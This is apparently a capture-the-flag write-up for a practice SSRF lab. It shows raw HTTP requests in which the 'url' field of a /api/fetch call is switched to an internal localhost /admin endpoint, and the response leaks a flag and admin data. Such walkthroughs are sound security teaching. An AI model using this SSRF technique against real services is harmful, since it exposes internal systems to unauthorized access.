---
title: "Tanuki SSRF"
date: 2025-12-7
author: Shawn Szczepkowski
---

Today we will be covering the Tanuki SSRF lab from [bugforge.io](https://bugforge.io). This is an easy rated lab.

While exploring todays application we notice a leaderboard that displays all users stats for usage of the flashcard application. On the front end this is `/leaderboard` but let's take a look at what is happening on the back end.

When we click on the leaderboard we notice a POST request to `/api/fetch` that is requesting info from an internal server:
```sh
POST /api/fetch HTTP/2
Host: bc055eb3f813.labs.bugforge.io
Content-Length: 43
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY1MDgyMjI2fQ.a_-uJqmPzC16eGAISOX5VkNW1Iu9_WKKKI3Pap_TUu4
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Origin: https://bc055eb3f813.labs.bugforge.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://bc055eb3f813.labs.bugforge.io/leaderboard
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{
	"url":"http://localhost:3000/leaderboard"
}
```

Looks like a set up for possible SSRF. Let's send the request over to repeater first and see if we can reach anything else interesting by trying a few common sense endpoints, and then possibly move over to intruder for some fuzzing if we can't find anything interesting.

The first thing I try is changing `/leadboard` to `/admin`.
```sh
POST /api/fetch HTTP/2
Host: bc055eb3f813.labs.bugforge.io
Content-Length: 37
Sec-Ch-Ua-Platform: "Linux"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwidXNlcm5hbWUiOiJ0ZXN0IiwiaWF0IjoxNzY1MDgyMjI2fQ.a_-uJqmPzC16eGAISOX5VkNW1Iu9_WKKKI3Pap_TUu4
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json
Origin: https://bc055eb3f813.labs.bugforge.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://bc055eb3f813.labs.bugforge.io/leaderboard
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{
	"url":"http://localhost:3000/admin"
}
```

And indeed we can reach the internal Admin endpoint, giving us our flag.
```sh
HTTP/2 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json; charset=utf-8
Date: Sun, 07 Dec 2025 04:38:24 GMT
Etag: W/"97-xYK0FGdnWZtB6FljRyiCc6xyyVQ"
X-Powered-By: Express
Content-Length: 151

{
	"message":"Admin endpoint accessed",
	"flag":"bug{57ad1119edfebd2547374c842d5a7fab}",
	"admin_data":{
		"server_version":"1.0.0",
		"environment":"production"
	}
}
```
